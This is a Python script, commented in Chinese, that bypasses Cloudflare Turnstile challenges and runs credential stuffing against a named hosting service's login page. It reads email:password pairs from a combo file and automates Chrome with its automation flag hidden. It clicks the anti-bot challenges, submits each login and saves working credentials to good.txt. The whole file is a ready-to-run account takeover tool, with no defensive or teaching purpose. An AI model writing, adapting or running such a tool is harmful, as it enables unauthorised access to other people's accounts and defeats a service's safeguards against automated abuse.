"""
花云 CF 绕过 + 批量登录验证
安装: pip install DrissionPage
运行前: taskkill /F /IM chrome.exe /T
"""

import sys
import os
import time
import random

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] pip install DrissionPage")
    sys.exit(1)

# ==================== 配置 ====================
TARGET_BASE = "https://api-flowercloud.com"
LOGIN_URL = TARGET_BASE + "/index.php?rp=/login"
COMBO_FILE = "combo_f.txt"
GOOD_FILE = "good.txt"
BAD_FILE = "bad.txt"
MAX_CF_WAIT = 120
DELAY_BETWEEN = 3
CHROME_PATH = None
# ==============================================


def find_browser():
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None


def is_challenge_page(page):
    try:
        title = page.title.lower() if page.title else ""
    except:
        return True
    signs = ["just a moment", "checking", "attention required", "please wait"]
    return any(s in title for s in signs)


def try_click_turnstile(page):
    try:
        iframes = page.eles("tag:iframe")
        for iframe in iframes:
            src = iframe.attr("src") or ""
            if "challenges.cloudflare.com" in src or "turnstile" in src:
                try:
                    iframe.click()
                    return True
                except:
                    pass
    except:
        pass

    try:
        cf_div = page.ele("css:.cf-turnstile", timeout=2)
        if cf_div:
            cf_div.click()
            return True
    except:
        pass

    try:
        elements = page.eles("css:div[id^='cf-']")
        for el in elements:
            try:
                el.click()
                return True
            except:
                pass
    except:
        pass

    return False


def wait_cf(page, max_wait=MAX_CF_WAIT):
    start = time.time()
    clicked = False

    while time.time() - start < max_wait:
        if not is_challenge_page(page):
            return True

        if not clicked or (time.time() - start) % 5 < 2:
            if try_click_turnstile(page):
                clicked = True
                time.sleep(4)
                continue

        elapsed = int(time.time() - start)
        if elapsed % 10 == 0:
            print("    ... CF 验证中 (" + str(elapsed) + "s)")
        time.sleep(2)

    return not is_challenge_page(page)


def solve_cf(page, url):
    page.get(url)
    time.sleep(2)

    if is_challenge_page(page):
        print("    [*] CF 验证中...")
        passed = wait_cf(page)
        if passed:
            print("    [+] CF 通过！")
            time.sleep(2)
            return True
        else:
            print("    [!] CF 超时")
            return False
    return True


def do_login(page, email, password):
    if not solve_cf(page, LOGIN_URL):
        return "error"

    time.sleep(2)

    try:
        email_input = (
            page.ele('input[name="username"]', timeout=8)
            or page.ele('input[type="email"]', timeout=3)
            or page.ele('#inputEmail', timeout=3)
        )
        if not email_input:
            print("    [!] 找不到邮箱框")
            return "error"

        email_input.clear()
        time.sleep(0.2)
        email_input.input(email)
        time.sleep(0.3)

        pass_input = (
            page.ele('input[name="password"]', timeout=5)
            or page.ele('input[type="password"]', timeout=3)
            or page.ele('#inputPassword', timeout=3)
        )
        if not pass_input:
            print("    [!] 找不到密码框")
            return "error"

        pass_input.clear()
        time.sleep(0.2)
        pass_input.input(password)
        time.sleep(0.3)

        btn = (
            page.ele('input[type="submit"]', timeout=3)
            or page.ele('button[type="submit"]', timeout=3)
            or page.ele('#login', timeout=3)
        )
        if not btn:
            print("    [!] 找不到登录按钮")
            return "error"

        btn.click()
        time.sleep(4)

        if is_challenge_page(page):
            print("    [*] 登录后触发CF...")
            wait_cf(page, 60)
            time.sleep(3)

        page_text = page.html.lower() if page.html else ""
        current_url = page.url.lower() if page.url else ""

        good_signs = ["logout", "log out", "my services", "welcome", "clientarea.php?action=", "dashboard"]
        bad_signs = ["incorrect", "invalid", "not correct", "login details"]

        for s in good_signs:
            if s in page_text or s in current_url:
                return "good"

        for s in bad_signs:
            if s in page_text:
                return "bad"

        if "clientarea" in current_url and "login" not in current_url:
            return "good"

        return "bad"

    except Exception as e:
        print("    [!] 异常: " + str(e))
        return "error"


def save_result(filename, content):
    f = open(filename, "a", encoding="utf-8")
    f.write(content)
    f.write(os.linesep)
    f.close()


def main():
    print("")
    print("  =============================================")
    print("    花云 CF 绕过 + 批量登录")
    print("  =============================================")
    print("")

    if not os.path.exists(COMBO_FILE):
        print("[!] 找不到 " + COMBO_FILE)
        sys.exit(1)

    f = open(COMBO_FILE, "r", encoding="utf-8")
    lines = [l.strip() for l in f.readlines() if ":" in l.strip()]
    f.close()

    if not lines:
        print("[!] combo 文件为空")
        sys.exit(1)

    print("[+] 加载 " + str(len(lines)) + " 个账号")

    global CHROME_PATH
    if not CHROME_PATH:
        CHROME_PATH = find_browser()
    if not CHROME_PATH:
        print("[!] 找不到浏览器")
        sys.exit(1)
    print("[+] 浏览器: " + CHROME_PATH)

    print("[*] 启动浏览器...")
    co = ChromiumOptions()
    co.set_browser_path(CHROME_PATH)
    co.set_argument("--start-maximized")
    co.set_argument("--disable-blink-features=AutomationControlled")
    co.set_argument("--no-first-run")
    co.set_argument("--no-default-browser-check")

    try:
        page = ChromiumPage(co)
    except Exception as e:
        print("[!] 启动失败: " + str(e))
        print("[*] 先运行: taskkill /F /IM chrome.exe /T")
        sys.exit(1)

    print("[+] 浏览器OK")

    print("[*] 首次访问过CF...")
    page.get(TARGET_BASE + "/clientarea.php")
    time.sleep(3)

    if is_challenge_page(page):
        print("[*] 检测到CF，尝试自动点击...")
        passed = wait_cf(page)
        if not passed:
            print("[!] 自动过盾失败")
            print("[*] 请在Chrome窗口手动点击验证框，然后回来按Enter...")
            input()
    else:
        print("[+] 无需CF验证或已自动通过")

    print("")
    print("[+] CF已通过，开始批量登录")
    print("=" * 50)
    print("")

    good = 0
    bad = 0
    err = 0

    for i, line in enumerate(lines):
        parts = line.split(":", 1)
        if len(parts) != 2:
            continue

        email = parts[0].strip()
        password = parts[1].strip()

        print("[" + str(i+1) + "/" + str(len(lines)) + "] " + email)

        result = do_login(page, email, password)

        if result == "good":
            good += 1
            print("    >>> SUCCESS <<<")
            save_result(GOOD_FILE, line)
        elif result == "bad":
            bad += 1
            print("    --- FAIL ---")
            save_result(BAD_FILE, line)
        else:
            err += 1
            print("    !!! ERROR !!!")
            save_result(BAD_FILE, line)

        print("    [G:" + str(good) + " B:" + str(bad) + " E:" + str(err) + "]")
        print("")

        if i < len(lines) - 1:
            time.sleep(random.uniform(DELAY_BETWEEN, DELAY_BETWEEN + 2))

    print("=" * 50)
    print("  完成！")
    print("  Good: " + str(good) + " -> " + GOOD_FILE)
    print("  Bad:  " + str(bad) + " -> " + BAD_FILE)
    print("  Error:" + str(err))
    print("=" * 50)

    page.quit()


if __name__ == "__main__":
    main()
